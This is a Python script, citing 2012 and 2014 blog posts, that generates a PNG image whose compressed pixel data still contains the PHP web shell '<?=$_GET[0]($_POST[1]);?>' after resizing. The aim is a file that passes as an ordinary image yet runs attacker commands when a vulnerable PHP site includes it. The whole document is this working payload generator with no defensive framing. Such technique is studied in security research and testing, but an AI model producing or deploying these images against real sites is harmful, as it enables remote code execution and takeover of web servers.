def reverse_filter(hex_string, filter_type):
    p = [int(hex_string[i:i + 2], 16) for i in range(0, len(hex_string), 2)]
    s = len(p) - 3

    if filter_type == 1:
        for i in range(s):
            p[i + 3] = (p[i + 3] + p[i]) % 256
    elif filter_type == 3:
        for i in range(s):
            p[i + 3] = (p[i + 3] + p[i] // 2) % 256

    return p


def main():
    from io import BytesIO
    from os import urandom
    from PIL import Image
    from PIL.Image import Resampling

    # Computed by PHIL (2012) | Correspond to <?=$_GET[0]($_POST[1]);?>
    # Appropriate for an image of 80x80 reduced to 40x40
    # https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
    size = 40
    hex_string = "a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310"
    expected_payload = b'<?=$_GET[0]($_POST[1]);?>'

    # Computed by PHIL242 (2014)
    # Appropriate for an image of 110x110 reduce to 55x55
    # https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/
    #
    # When calling the function multiple times (<100), we can get a valid result for a size
    # up to 61 (+=21) pixels. After this value, it seems the "I CANNOT EXPLAIN WHY" trick won't work
    size += 15
    hex_string += urandom(size - 1).hex()

    hex_string += '0' * ((6 - len(hex_string) % 6) % 6)

    if len(hex_string) // 3 >= size:
        print("There is a problem, the code doesn't support a payload that is longer than the width.")
        return False

    p = []
    p += reverse_filter(hex_string, 1)
    p += reverse_filter(hex_string, 3)

    # Create a new image
    img = Image.new('RGB', (size, size))

    # Set pixels based on the provided array
    for i in range(0, len(p), 3):
        r, g, b = p[i], p[i + 1], p[i + 2]
        img.putpixel((i // 3, 0), (r, g, b))

    scaled_img = img.resize((size * 2, size * 2), Resampling.NEAREST)
    scaled_img.save('in.png')

    new_image = scaled_img.resize((size, size), Resampling.NEAREST)
    new_image.save("out.png", 'PNG')

    buffer = BytesIO()
    new_image.save(buffer, format='PNG')
    buffer.seek(0)
    if expected_payload in buffer.read():
        print("Done")
        return True
    else:
        print("Try again. Failed with ", hex_string)
        return False


if __name__ == '__main__':
    main()